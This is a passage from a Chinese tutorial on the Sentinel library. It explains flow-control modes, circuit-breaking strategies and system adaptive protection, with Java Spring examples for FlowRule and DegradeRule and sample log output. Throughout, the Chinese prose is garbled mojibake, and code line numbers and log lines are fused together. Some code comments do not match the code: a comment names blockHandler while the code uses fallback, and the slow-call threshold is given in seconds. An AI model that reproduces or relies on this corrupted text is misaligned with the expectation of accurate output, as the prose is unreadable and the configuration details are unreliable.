æ—¶ï¼Œä¼šç›´æ¥æŠŠç³»ç»Ÿæ‹‰å‡åˆ°é«˜æ°´ä½ï¼Œè¿™å¯èƒ½ä¼šç¬é—´æŠŠç³»ç»Ÿæ‹‰è·¨ã€‚é€šè¿‡â€ å†·å¯åŠ¨â€ï¼Œè®©é€šè¿‡çš„æµé‡ç¼“æ…¢å¢åŠ ï¼Œåœ¨ä¸€å®šæ—¶é—´å†…é€æ¸å¢åŠ åˆ°é˜ˆå€¼ä¸Šé™ï¼Œç»™å†·ç³»ç»Ÿä¸€ä¸ªé¢„çƒ­çš„æ—¶é—´ï¼Œé¿å…å†·ç³»ç»Ÿè¢«å‹å®ã€‚ åŒ€é€Ÿæ’é˜Ÿï¼ˆRuleConstant.CONTROL_BEHAVIOR_RATE_LIMITERï¼‰æ–¹å¼ä¼šä¸¥æ ¼æ§åˆ¶è¯·æ±‚é€šè¿‡çš„é—´éš”æ—¶é—´ï¼Œä¹Ÿå³æ˜¯è®©è¯·æ±‚ä»¥å‡åŒ€çš„é€Ÿåº¦é€šè¿‡ï¼Œå¯¹åº”çš„æ˜¯æ¼æ¡¶ç®—æ³•ï¼Œä¾‹å¦‚é˜ˆå€¼ QPS=2 æ—¶ï¼Œæ¯ä¸ª 500ms å¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼Œå‡è®¾å½“å‰æœ‰ 10 ä¸ªè¯·æ±‚åˆ™éœ€è¦æ’é˜Ÿå¤„ç† 5 ç§’ã€‚ ç‰¹åˆ«æ³¨æ„ï¼šåŒä¸€ä¸ªèµ„æºå¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ªæµæ§è§„åˆ™ï¼ŒSentinel æ£€æŸ¥è§„åˆ™æ—¶ä¼šä¾æ¬¡æ£€æŸ¥ã€‚ 2.3ã€æµé‡æ§åˆ¶è§„åˆ™çš„è®¾ç½®æµé‡æ§åˆ¶è§„åˆ™è®¾ç½®æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š æœ¬åœ°ä»£ç è®¾ç½® åœ¨ Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® 2.3.1ã€ä»£ç è®¾ç½®ä»¥ä¸‹åªç»™å‡ºæµé‡æ§åˆ¶çš„ç®€å•ç¤ºä¾‹ä»£ç ï¼Œè‹¥éœ€è¦æ›´è¯¦ç»†çš„æµé‡æ§åˆ¶ä»£ç ç¤ºä¾‹ï¼Œå¯ä»¥ç‚¹è¿™é‡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@RestControllerpublic class DegradeController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Flow"; /** * @return * @SentinelResource å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šé™æµå¤„ç†çš„æ–¹æ³• */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // è¢«ä¿æŠ¤çš„èµ„æº return "Hello Sentinel!"; } /** * åŸæ–¹æ³•è¢«é™æµçš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; } /** * å½“å‰ç±»çš„æ„é€ æ–¹æ³•æ‰§è¡Œä¹‹åæ‰§è¡Œæ­¤æ–¹æ³• */ @PostConstruct public void initFlowRules() { // åˆ›å»ºå­˜æ”¾æµæ§è§„åˆ™çš„é›†åˆ List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // åˆ›å»ºæµæ§è§„åˆ™ FlowRule rule = new FlowRule(); // å®šä¹‰èµ„æºï¼Œè¡¨ç¤ºSentinelä¼šå¯¹å“ªä¸ªèµ„æºç”Ÿæ•ˆ rule.setResource(RESOURCE_NAME); // å®šä¹‰æµæ§è§„åˆ™çš„ç±»å‹ rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // å®šä¹‰QPSæ¯ç§’èƒ½é€šè¿‡çš„è¯·æ±‚æ•° rule.setCount(2); // å°†æµæ§è§„åˆ™å­˜æ”¾åœ¨é›†åˆä¸­ rules.add(rule); // åŠ è½½æµæ§è§„åˆ™ FlowRuleManager.loadRules(rules); }} ç¨‹åºè¿è¡Œåï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œç„¶åå¿«é€Ÿå¤šæ¬¡åˆ·æ–°é¡µé¢ï¼Œå½“æ¯ç§’çš„è¯·æ±‚æ•°å¤§äº 2 æ—¶ï¼Œæ¥å£çš„è¯·æ±‚ç»“æœä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ...ï¼Œåˆ™è¯´æ˜ä¸Šé¢è®¾ç½®çš„æµæ§è§„åˆ™ç”Ÿæ•ˆäº†ã€‚ 2.3.2ã€æ³¨è§£å±æ€§è¯´æ˜ é€šè¿‡ @SentinelResource æ³¨è§£çš„ blockHandler å±æ€§åˆ¶å®šå…·ä½“çš„é™æµå¤„ç†æ–¹æ³• å®ç°å¤„ç†æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä¼ å‚å¿…é¡»ä¸èµ„æºç‚¹çš„ä¼ å‚ä¸€æ ·ï¼Œå¹¶ä¸”æœ€åå¿…é¡»åŠ ä¸Š BlockException å¼‚å¸¸å‚æ•°ï¼ŒåŒæ—¶è¿”å›ç±»å‹ä¹Ÿå¿…é¡»ä¸€æ · 2.3.3ã€Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® Sentinel ç†”æ–­é™çº§å®ç°3.0ã€ç†”æ–­é™çº§æ¦‚è¿°é™¤äº†æµé‡æ§åˆ¶ä»¥å¤–ï¼Œå¯¹è°ƒç”¨é“¾è·¯ä¸­ä¸ç¨³å®šçš„èµ„æºè¿›è¡Œç†”æ–­é™çº§ä¹Ÿæ˜¯ä¿éšœé«˜å¯ç”¨çš„é‡è¦æªæ–½ä¹‹ä¸€ã€‚ä¸€ä¸ªæœåŠ¡å¸¸å¸¸ä¼šè°ƒç”¨åˆ«çš„æ¨¡å—ï¼Œå¯èƒ½æ˜¯å¦å¤–çš„ä¸€ä¸ªè¿œç¨‹æœåŠ¡ã€æ•°æ®åº“ï¼Œæˆ–è€…ç¬¬ä¸‰æ–¹ API ç­‰ã€‚ä¾‹å¦‚ï¼Œæ”¯ä»˜çš„æ—¶å€™ï¼Œå¯èƒ½éœ€è¦è¿œç¨‹è°ƒç”¨é“¶è”æä¾›çš„ APIï¼›æŸ¥è¯¢æŸä¸ªå•†å“çš„ä»·æ ¼ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ã€‚ç„¶è€Œï¼Œè¿™ä¸ªè¢«ä¾èµ–æœåŠ¡çš„ç¨³å®šæ€§æ˜¯ä¸èƒ½ä¿è¯çš„ã€‚å¦‚æœä¾èµ–çš„æœåŠ¡å‡ºç°äº†ä¸ç¨³å®šçš„æƒ…å†µï¼Œè¯·æ±‚çš„å“åº”æ—¶é—´å˜é•¿ï¼Œé‚£ä¹ˆè°ƒç”¨æœåŠ¡çš„æ–¹æ³•çš„å“åº”æ—¶é—´ä¹Ÿä¼šå˜é•¿ï¼Œçº¿ç¨‹ä¼šäº§ç”Ÿå †ç§¯ï¼Œæœ€ç»ˆå¯èƒ½è€—å°½ä¸šåŠ¡è‡ªèº«çš„çº¿ç¨‹æ± ï¼ŒæœåŠ¡æœ¬èº«ä¹Ÿå˜å¾—ä¸å¯ç”¨ã€‚ ç°ä»£å¾®æœåŠ¡æ¶æ„éƒ½æ˜¯åˆ†å¸ƒå¼çš„ï¼Œç”±éå¸¸å¤šçš„æœåŠ¡ç»„æˆã€‚ä¸åŒæœåŠ¡ä¹‹é—´ç›¸äº’è°ƒç”¨ï¼Œç»„æˆå¤æ‚çš„è°ƒç”¨é“¾è·¯ã€‚ä»¥ä¸Šçš„é—®é¢˜åœ¨é“¾è·¯è°ƒç”¨ä¸­ä¼šäº§ç”Ÿæ”¾å¤§çš„æ•ˆæœã€‚å¤æ‚é“¾è·¯ä¸Šçš„æŸä¸€ç¯ä¸ç¨³å®šï¼Œå°±å¯èƒ½ä¼šå±‚å±‚çº§è”ï¼Œæœ€ç»ˆå¯¼è‡´æ•´ä¸ªé“¾è·¯éƒ½ä¸å¯ç”¨ã€‚å› æ­¤éœ€è¦å¯¹ä¸ç¨³å®šçš„å¼±ä¾èµ–æœåŠ¡è°ƒç”¨è¿›è¡Œç†”æ–­é™çº§ï¼Œæš‚æ—¶åˆ‡æ–­ä¸ç¨³å®šè°ƒç”¨ï¼Œé¿å…å±€éƒ¨ä¸ç¨³å®šå› ç´ å¯¼è‡´æ•´ä½“çš„é›ªå´©ã€‚ç†”æ–­é™çº§ä½œä¸ºä¿æŠ¤è‡ªèº«çš„æ‰‹æ®µï¼Œé€šå¸¸åœ¨å®¢æˆ·ç«¯ï¼ˆè°ƒç”¨ç«¯ï¼‰è¿›è¡Œé…ç½®ã€‚ç†”æ–­é™çº§ä¼šåœ¨è°ƒç”¨é“¾è·¯ä¸­æŸä¸ªèµ„æºå‡ºç°ä¸ç¨³å®šçŠ¶æ€æ—¶ï¼ˆä¾‹å¦‚è°ƒç”¨è¶…æ—¶æˆ–è€…å¼‚å¸¸æ¯”ä¾‹å‡é«˜ï¼‰ï¼Œå¯¹è¿™ä¸ªèµ„æºçš„è°ƒç”¨è¿›è¡Œé™åˆ¶ï¼Œè®©è¯·æ±‚å¿«é€Ÿå¤šæ¬¡å¤±è´¥ï¼Œé¿å…å½±å“åˆ°å…¶ä»–çš„èµ„æºè€Œå¯¼è‡´çº§è”æ•…éšœï¼ˆæœåŠ¡é›ªå´©ï¼‰ã€‚å½“èµ„æºè¢«é™çº§åï¼Œåœ¨æ¥ä¸‹æ¥çš„é™çº§æ—¶é—´çª—å£ä¹‹å†…ï¼Œå¯¹è¯¥èµ„æºçš„è°ƒç”¨éƒ½è‡ªåŠ¨ç†”æ–­ï¼ˆé»˜è®¤è¡Œä¸ºæ˜¯æŠ›å‡º DegradeExceptionï¼‰ã€‚ 3.1ã€ç†”æ–­é™çº§ç­–ç•¥ æ…¢è°ƒç”¨æ¯”ä¾‹ (SLOW_REQUEST_RATIOï¼‰ï¼šé€‰æ‹©ä»¥æ…¢è°ƒç”¨æ¯”ä¾‹ä½œä¸ºé˜ˆå€¼ï¼Œéœ€è¦è®¾ç½®å…è®¸çš„æ…¢è°ƒç”¨ RTï¼ˆå³æœ€å¤§çš„å“åº”æ—¶é—´ï¼‰ï¼Œè¯·æ±‚çš„å“åº”æ—¶é—´å¤§äºè¯¥å€¼åˆ™ç»Ÿè®¡ä¸ºæ…¢è°ƒç”¨ã€‚å½“å•ä½ç»Ÿè®¡æ—¶é•¿ï¼ˆstatIntervalMsï¼‰å†…è¯·æ±‚æ•°ç›®å¤§äºè®¾ç½®çš„æœ€å°è¯·æ±‚æ•°ç›®ï¼Œå¹¶ä¸”æ…¢è°ƒç”¨çš„æ¯”ä¾‹å¤§äºé˜ˆå€¼ï¼Œåˆ™æ¥ä¸‹æ¥çš„ç†”æ–­æ—¶é•¿å†…è¯·æ±‚ä¼šè‡ªåŠ¨è¢«ç†”æ–­ã€‚ç»è¿‡ç†”æ–­æ—¶é•¿åç†”æ–­å™¨ä¼šè¿›å…¥æ¢æµ‹æ¢å¤çŠ¶æ€ï¼ˆHALF-OPEN çŠ¶æ€ï¼‰ï¼Œè‹¥æ¥ä¸‹æ¥çš„ä¸€ä¸ªè¯·æ±‚å“åº”æ—¶é—´å°äºè®¾ç½®çš„æ…¢è°ƒç”¨ RT åˆ™ç»“æŸç†”æ–­ï¼Œè‹¥å¤§äºè®¾ç½®çš„æ…¢è°ƒç”¨ RT åˆ™ä¼šå†æ¬¡è¢«ç†”æ–­ã€‚ å¼‚å¸¸æ¯”ä¾‹ (ERROR_RATIOï¼‰ï¼šå½“å•ä½ç»Ÿè®¡æ—¶é•¿ï¼ˆstatIntervalMsï¼‰å†…è¯·æ±‚æ•°ç›®å¤§äºè®¾ç½®çš„æœ€å°è¯·æ±‚æ•°ç›®ï¼Œå¹¶ä¸”å¼‚å¸¸çš„æ¯”ä¾‹å¤§äºé˜ˆå€¼ï¼Œåˆ™æ¥ä¸‹æ¥çš„ç†”æ–­æ—¶é•¿å†…è¯·æ±‚ä¼šè‡ªåŠ¨è¢«ç†”æ–­ã€‚ç»è¿‡ç†”æ–­æ—¶é•¿åç†”æ–­å™¨ä¼šè¿›å…¥æ¢æµ‹æ¢å¤çŠ¶æ€ï¼ˆHALF-OPEN çŠ¶æ€ï¼‰ï¼Œè‹¥æ¥ä¸‹æ¥çš„ä¸€ä¸ªè¯·æ±‚æˆåŠŸå®Œæˆï¼ˆæ²¡æœ‰é”™è¯¯ï¼‰åˆ™ç»“æŸç†”æ–­ï¼Œå¦åˆ™ä¼šå†æ¬¡è¢«ç†”æ–­ã€‚å¼‚å¸¸æ¯”ç‡çš„é˜ˆå€¼èŒƒå›´æ˜¯ [0.0, 1.0]ï¼Œä»£è¡¨ 0% - 100%ã€‚ å¼‚å¸¸æ•° (ERROR_COUNTï¼‰ï¼šå½“å•ä½ç»Ÿè®¡æ—¶é•¿å†…çš„å¼‚å¸¸æ•°ç›®è¶…è¿‡é˜ˆå€¼ä¹‹åä¼šè‡ªåŠ¨è¿›è¡Œç†”æ–­ã€‚ç»è¿‡ç†”æ–­æ—¶é•¿åç†”æ–­å™¨ä¼šè¿›å…¥æ¢æµ‹æ¢å¤çŠ¶æ€ï¼ˆHALF-OPEN çŠ¶æ€ï¼‰ï¼Œè‹¥æ¥ä¸‹æ¥çš„ä¸€ä¸ªè¯·æ±‚æˆåŠŸå®Œæˆï¼ˆæ²¡æœ‰é”™è¯¯ï¼‰åˆ™ç»“æŸç†”æ–­ï¼Œå¦åˆ™ä¼šå†æ¬¡è¢«ç†”æ–­ã€‚ ç‰¹åˆ«æ³¨æ„ï¼šå¼‚å¸¸é™çº§ä»…é’ˆå¯¹ä¸šåŠ¡å¼‚å¸¸ï¼Œå¯¹ Sentinel é™æµé™çº§æœ¬èº«çš„å¼‚å¸¸ï¼ˆBlockExceptionï¼‰ä¸ç”Ÿæ•ˆã€‚ 3.2ã€ç†”æ–­é™çº§è§„åˆ™çš„å±æ€§ç†”æ–­é™çº§è§„åˆ™ï¼ˆDegradeRuleï¼‰åŒ…å«ä¸‹é¢å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š ç‰¹åˆ«æ³¨æ„ï¼šåŒä¸€ä¸ªèµ„æºå¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ªç†”æ–­é™çº§è§„åˆ™ã€‚ 3.3ã€ç†”æ–­é™çº§è§„åˆ™çš„è®¾ç½®ç†”æ–­é™çº§è§„åˆ™è®¾ç½®æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š æœ¬åœ°ä»£ç è®¾ç½® åœ¨ Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® 3.3.1ã€ä»£ç è®¾ç½®ä¸‹é¢å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨æ…¢è°ƒç”¨æ¯”ä¾‹ (SLOW_REQUEST_RATIOï¼‰ç†”æ–­é™çº§è§„åˆ™ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768@RestControllerpublic class DegradeController { private static final String RESOURCE_NAME = "Degrade"; private Logger LOG = LoggerFactory.getLogger(DegradeController.class); /** * @return * @SentinelResource å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šç†”æ–­é™çº§å¤„ç†çš„æ–¹æ³• */ @SentinelResource(value = RESOURCE_NAME, fallback = "exceptionHandler") @GetMapping("/hello") public String hello() { // è¢«ä¿æŠ¤çš„èµ„æº try { Random random = new Random(); int millis = random.nextInt(10); LOG.info("sleep time: " + millis); // éšæœºä¼‘çœ 10æ¯«ç§’ä»¥å†…ï¼Œæ¨¡æ‹Ÿæ¥å£æ…¢è°ƒç”¨ Thread.sleep(millis); } catch (InterruptedException e) { e.printStackTrace(); } return "hello"; } /** * åŸæ–¹æ³•è¢«ç†”æ–­é™çº§çš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @return */ public String exceptionHandler() { LOG.error("fallback handler invoke"); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; } /** * å®šä¹‰ç†”æ–­é™çº§è§„åˆ™ */ @PostConstruct public void initDegradeRule() { // åˆ›å»ºå­˜æ”¾ç†”æ–­é™çº§è§„åˆ™çš„é›†åˆ List&lt;DegradeRule&gt; rules = new ArrayList&lt;&gt;(); // åˆ›å»ºç†”æ–­é™çº§è§„åˆ™ DegradeRule rule = new DegradeRule(); // å®šä¹‰èµ„æºåç§° rule.setResource(RESOURCE_NAME); // å®šä¹‰ç†”æ–­é™çº§è§„åˆ™çš„ç±»å‹ rule.setGrade(RuleConstant.DEGRADE_GRADE_RT); // å®šä¹‰é™çº§ç†”æ–­æ—¶é—´ï¼ˆå•ä½ sï¼‰ rule.setTimeWindow(5); // å®šä¹‰æ…¢è°ƒç”¨ä¸´ç•ŒRTï¼ˆè¶…å‡ºè¯¥å€¼è®¡ä¸ºæ…¢è°ƒç”¨ï¼Œå•ä½ sï¼‰ rule.setCount(0.005); // å®šä¹‰ç†”æ–­è§¦å‘çš„æœ€å°è¯·æ±‚æ•° rule.setMinRequestAmount(1); // å®šä¹‰ç»Ÿè®¡æ—¶é•¿ï¼ˆå•ä½ä¸º msï¼‰ rule.setStatIntervalMs(1000); // å®šä¹‰æ…¢è°ƒç”¨æ¯”ä¾‹é˜ˆå€¼ rule.setSlowRatioThreshold(0.5); // å°†ç†”æ–­é™çº§è§„åˆ™æ·»åŠ åˆ°é›†åˆä¸­ rules.add(rule); // åŠ è½½ç†”æ–­é™çº§è§„åˆ™ DegradeRuleManager.loadRules(rules); }} ä¸Šè¿°å®šä¹‰çš„æ…¢è°ƒç”¨æ¯”ä¾‹ç†”æ–­é™çº§è§„åˆ™ä¸ºï¼šè°ƒç”¨ä¸´ç•Œ RTï¼ˆè¶…å‡ºè¯¥å€¼è®¡ä¸ºæ…¢è°ƒç”¨ï¼‰å€¼ä¸º 0.005 ç§’ï¼Œå½“ 1000 æ¯«ç§’å†…è¯·æ±‚æ•°é‡å¤§äº 1ï¼Œä¸”æ…¢è°ƒç”¨çš„æ¯”ä¾‹å¤§äºé˜ˆå€¼å¤§äº 0.5ï¼Œåˆ™ç†”æ–­é™çº§ 5 ç§’ã€‚ ç¨‹åºè¿è¡Œåï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œç„¶åå¿«é€Ÿå¤šæ¬¡åˆ·æ–°é¡µé¢ï¼Œè‹¥è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ç±»ä¼¼ä¸‹é¢çš„å†…å®¹ï¼Œåˆ™è¯´æ˜ä¸Šé¢è®¾ç½®çš„ç†”æ–­é™çº§è§„åˆ™ç”Ÿæ•ˆäº†ã€‚ 123456789102020-01-18 22:15:45.705 INFO 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : sleep time: 82020-01-18 22:15:46.585 ERROR 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:47.112 ERROR 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:48.911 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.505 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.809 ERROR 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:51.511 INFO 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : sleep time: 12020-01-18 22:15:51.834 INFO 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : sleep time: 32020-01-18 22:15:52.428 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:52.846 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke 3.3.2ã€æ³¨è§£å±æ€§è¯´æ˜ 3.3.3ã€Sentinel æ§åˆ¶å°åŠ¨æ€è®¾ç½® Sentinel ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤å®ç°4.0ã€ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤æ¦‚è¿°åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹ç³»ç»Ÿä¿æŠ¤çš„ç›®çš„ï¼š ä¿è¯ç³»ç»Ÿä¸è¢«æ‹–å® åœ¨ç³»ç»Ÿç¨³å®šçš„å‰æä¸‹ï¼Œä¿æŒç³»ç»Ÿçš„ååé‡ é•¿æœŸä»¥æ¥ï¼Œç³»ç»Ÿä¿æŠ¤çš„æ€è·¯æ˜¯æ ¹æ®ç¡¬æŒ‡æ ‡ï¼Œå³ç³»ç»Ÿçš„è´Ÿè½½ (load1) æ¥åšç³»ç»Ÿè¿‡è½½ä¿æŠ¤ã€‚å½“ç³»ç»Ÿè´Ÿè½½é«˜äºæŸä¸ªé˜ˆå€¼ï¼Œå°±ç¦æ­¢æˆ–è€…å‡å°‘æµé‡çš„è¿›å…¥ï¼›å½“ load å¼€å§‹å¥½è½¬ï¼Œåˆ™æ¢å¤æµé‡çš„è¿›å…¥ã€‚è¿™ä¸ªæ€è·¯ç»™æˆ‘ä»¬å¸¦æ¥äº†ä¸å¯é¿å…çš„ä¸¤ä¸ªé—®é¢˜ï¼š load æ˜¯ä¸€ä¸ª â€œç»“æœâ€ï¼Œå¦‚æœæ ¹æ® load çš„æƒ…å†µæ¥è°ƒèŠ‚æµé‡çš„é€šè¿‡ç‡ï¼Œé‚£ä¹ˆå°±å§‹ç»ˆæœ‰å»¶è¿Ÿæ€§ã€‚ä¹Ÿå°±æ„å‘³ç€é€šè¿‡ç‡çš„ä»»ä½•è°ƒæ•´ï¼Œéƒ½ä¼šè¿‡ä¸€æ®µæ—¶é—´æ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚å½“å‰é€šè¿‡ç‡æ˜¯ä½¿ load æ¶åŒ–çš„ä¸€ä¸ªåŠ¨ä½œï¼Œé‚£ä¹ˆä¹Ÿè‡³å°‘è¦è¿‡ 1 ç§’ä¹‹åæ‰èƒ½è§‚æµ‹åˆ°ï¼›åŒç†ï¼Œå¦‚æœå½“å‰é€šè¿‡ç‡è°ƒæ•´æ˜¯è®© load å¥½è½¬çš„ä¸€ä¸ªåŠ¨ä½œï¼Œä¹Ÿéœ€è¦ 1 ç§’ä¹‹åæ‰èƒ½ç»§ç»­è°ƒæ•´ï¼Œè¿™æ ·å°±æµªè´¹äº†ç³»ç»Ÿçš„å¤„ç†èƒ½åŠ›ã€‚æ‰€ä»¥æˆ‘ä»¬çœ‹åˆ°çš„æ›²çº¿ï¼Œæ€»æ˜¯ä¼šæœ‰æŠ–åŠ¨ã€‚ æ¢å¤æ…¢ã€‚æƒ³è±¡ä¸€ä¸‹è¿™æ ·çš„ä¸€ä¸ªåœºæ™¯ï¼ˆçœŸå®ï¼‰ï¼Œå‡ºç°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œä¸‹æ¸¸åº”ç”¨ä¸å¯é ï¼Œå¯¼è‡´åº”ç”¨ RT å¾ˆé«˜ï¼Œä»è€Œ load åˆ°äº†ä¸€ä¸ªå¾ˆé«˜çš„ç‚¹ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ä¹‹åä¸‹æ¸¸åº”ç”¨æ¢å¤äº†ï¼Œåº”ç”¨ RT ä¹Ÿç›¸åº”å‡å°‘ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå…¶å®åº”è¯¥å¤§å¹…åº¦å¢å¤§æµé‡çš„é€šè¿‡ç‡ï¼›ä½†æ˜¯ç”±äºè¿™ä¸ªæ—¶å€™ load ä»ç„¶å¾ˆé«˜ï¼Œé€šè¿‡ç‡çš„æ¢å¤ä»ç„¶ä¸é«˜ã€‚ TCP BBR çš„æ€æƒ³ç»™äº†æˆ‘ä»¬ä¸€ä¸ªå¾ˆå¤§çš„å¯å‘ã€‚æˆ‘ä»¬åº”è¯¥æ ¹æ®ç³»ç»Ÿèƒ½å¤Ÿå¤„ç†çš„è¯·æ±‚ï¼Œå’Œå…è®¸è¿›æ¥çš„è¯·æ±‚ï¼Œæ¥åšå¹³è¡¡ï¼Œè€Œä¸æ˜¯æ ¹æ®ä¸€ä¸ªé—´æ¥çš„æŒ‡æ ‡ï¼ˆç³»ç»Ÿ loadï¼‰æ¥åšé™æµã€‚æœ€ç»ˆæˆ‘ä»¬è¿½æ±‚çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸è¢«æ‹–å®çš„æƒ…å†µä¸‹ï¼Œæé«˜ç³»ç»Ÿçš„ååç‡ï¼Œè€Œä¸æ˜¯ load ä¸€å®šè¦åˆ°ä½äºæŸä¸ªé˜ˆå€¼ã€‚å¦‚æœæˆ‘ä»¬è¿˜æ˜¯æŒ‰ç…§å›ºæœ‰çš„æ€ç»´ï¼Œè¶…è¿‡ç‰¹å®šçš„ load å°±ç¦æ­¢æµé‡è¿›å…¥ï¼Œç³»ç»Ÿ load æ¢å¤å°±æ”¾å¼€æµé‡ï¼Œè¿™æ ·åšçš„ç»“æœæ˜¯æ— è®ºæˆ‘ä»¬æ€ä¹ˆè°ƒå‚æ•°ï¼Œè°ƒæ¯”ä¾‹ï¼Œéƒ½æ˜¯æŒ‰ç…§æœæ¥è°ƒèŠ‚å› ï¼Œéƒ½æ— æ³•å–å¾—è‰¯å¥½çš„æ•ˆæœã€‚Sentinel åœ¨ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤çš„åšæ³•æ˜¯ï¼Œç”¨ load1 ä½œä¸ºå¯åŠ¨è‡ªé€‚åº”ä¿æŠ¤çš„å› å­ï¼Œè€Œå…è®¸é€šè¿‡çš„æµé‡ç”±å¤„ç†è¯·æ±‚çš„èƒ½åŠ›ï¼Œå³è¯·æ±‚çš„å“åº”æ—¶é—´ä»¥åŠå½“å‰ç³»ç»Ÿæ­£åœ¨å¤„ç†çš„è¯·æ±‚é€Ÿç‡æ¥å†³å®šã€‚ 4.1ã€ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤ç­–ç•¥ç³»ç»Ÿä¿æŠ¤è§„åˆ™æ˜¯ä»åº”ç”¨çº§åˆ«çš„å…¥å£æµé‡è¿›è¡Œæ§åˆ¶ï¼Œä»å•å°æœºå™¨çš„ Loadã€CPU ä½¿ç”¨ç‡ã€å¹³å‡ RTã€å…¥å£ QPS å’Œå¹¶å‘çº¿ç¨‹æ•°ç­‰å‡ ä¸ªç»´åº¦ç›‘æ§åº”ç”¨æŒ‡æ ‡ï¼Œè®©ç³»ç»Ÿå°½å¯èƒ½è·‘åœ¨æœ€å¤§ååé‡çš„åŒæ—¶ä¿è¯ç³»ç»Ÿæ•´ä½“çš„ç¨³å®šæ€§ã€‚ç³»ç»Ÿä¿æŠ¤è§„åˆ™æ˜¯åº”ç”¨æ•´ä½“ç»´åº¦çš„ï¼Œè€Œä¸æ˜¯èµ„æºç»´åº¦çš„ï¼Œå¹¶ä¸”ä»…å¯¹å…¥å£æµé‡ç”Ÿæ•ˆã€‚å…¥å£æµé‡æŒ‡çš„æ˜¯è¿›å…¥åº”ç”¨çš„æµé‡ï¼ˆEntryType.INï¼‰ï¼Œæ¯”å¦‚ Web æœåŠ¡æˆ– Dubbo æœåŠ¡ç«¯æ¥æ”¶çš„è¯·æ±‚ï¼Œéƒ½å±äºå…¥å£æµé‡ã€‚ ç³»ç»Ÿè§„åˆ™æ”¯æŒä»¥ç­–ç•¥ï¼š Load è‡ªé€‚åº”ï¼ˆä»…å¯¹ Linux/Unix-like æœºå™¨ç”Ÿæ•ˆï¼‰ï¼šç³»ç»Ÿçš„ load1 ä½œä¸ºå¯å‘æŒ‡æ ‡ï¼Œè¿›è¡Œè‡ªé€‚åº”ç³»ç»Ÿä¿æŠ¤ã€‚å½“ç³»ç»Ÿ load1 è¶…è¿‡è®¾å®šçš„å¯å‘å€¼ï¼Œä¸”ç³»ç»Ÿå½“å‰çš„å¹¶å‘çº¿ç¨‹æ•°è¶…è¿‡ä¼°ç®—çš„ç³»ç»Ÿå®¹é‡æ—¶æ‰ä¼šè§¦å‘ç³»ç»Ÿä¿æŠ¤ï¼ˆBBR é˜¶æ®µï¼‰ã€‚ç³»ç»Ÿå®¹é‡ç”±ç³»ç»Ÿçš„ maxQps * minRt ä¼°ç®—å¾—å‡ºã€‚è®¾å®šå‚è€ƒå€¼ä¸€èˆ¬æ˜¯ CPU cores * 2.5ã€‚ CPU Usageï¼ˆ1.5.0+ ç‰ˆæœ¬ï¼‰ï¼šå½“ç³»ç»Ÿ CPU ä½¿ç”¨ç‡è¶…è¿‡é˜ˆå€¼å³è§¦å‘ç³»ç»Ÿä¿æŠ¤ï¼ˆå–å€¼èŒƒå›´ 0.0-1.0ï¼‰ï¼Œæ¯”è¾ƒçµæ•ã€‚ å¹³å‡ RTï¼šå½“å•å°æœºå™¨ä¸Šæ‰€æœ‰å…¥å£æµé‡çš„å¹³å‡ RT 